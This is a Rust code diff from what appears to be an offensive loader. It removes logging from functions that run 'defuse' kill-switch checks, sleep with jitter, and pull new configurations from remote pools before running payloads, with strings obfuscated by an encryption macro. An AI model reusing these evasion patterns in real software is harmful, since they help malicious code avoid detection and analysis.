@@ -218,13 +218,6 @@ impl Config {
         let mut nb_defuse: i32 = 1;
         let mut check_this_defuse = true;
         for defuse in defuse_list {
-            info!(
-                "{}/{}{}{:?}",
-                nb_defuse,
-                defuse_list.len(),
-                encrypt_string!(" defuse: "),
-                defuse
-            );
             if check_this_defuse {
                 if defuse.stop_the_exec(&self) {
                     match defuse.get_operator() {
@@ -253,7 +246,6 @@ impl Config {
 
         let jitt = (self.jitt as f64) * random_number;
         let total_sleep = (self.sleep as f64) + jitt;
-        info!("{}{}", encrypt_string!("sleep: "), total_sleep);
         let sleep_time: time::Duration = time::Duration::from_millis((total_sleep * 1000.0) as u64);
         thread::sleep(sleep_time);
     }
@@ -263,61 +255,19 @@ impl Config {
         let mut pool_nb: i32 = 0;
         for (_pool_nb, (pool_name, pool_links)) in &self.update_links {
             pool_nb = pool_nb + 1;
-            info!(
-                "{}/{}{}{}",
-                pool_nb,
-                &self.update_links.len(),
-                encrypt_string!(" PoolLinks: "),
-                &pool_name
-            );
             match pool_links.update_pool(&self, session_id, running_thread) {
                 Ok(newconf) => {
                     if self.is_same_loader(&newconf) {
-                        info!(
-                            "{}",
-                            encrypt_string!(
-                                "[+] the new config is identical to the current config"
-                            )
-                        );
-                        info!(
-                            "{}",
-                            encrypt_string!(
-                                "[+] DECISION: keep the same active CONFIG, and run the payloads"
-                            )
-                        );
                     } else {
-                        info!(
-                            "{}",
-                            encrypt_string!("the new config is different from the current config")
-                        );
-                        info!(
-                            "{}",
-                            encrypt_string!(
-                                "[+] DECISION: replace the active CONFIG, and run the payloads"
-                            )
-                        );
                     }
 
                     return newconf;
                 }
                 Err(error) => {
-                    warn!(
-                        "{}{}",
-                        encrypt_string!("[+] Switch to next PoolLinks, reason: "),
-                        error
-                    );
                     ()
                 }
             };
         }
-        warn!(
-            "{}",
-            encrypt_string!("[+] All PoolLinks fetch without finding a new fresh VALID config")
-        );
-        info!(
-            "{}",
-            encrypt_string!("[+] DECISION: keep the same active CONFIG, and run the payloads")
-        );
         self.to_owned()
     }
 }
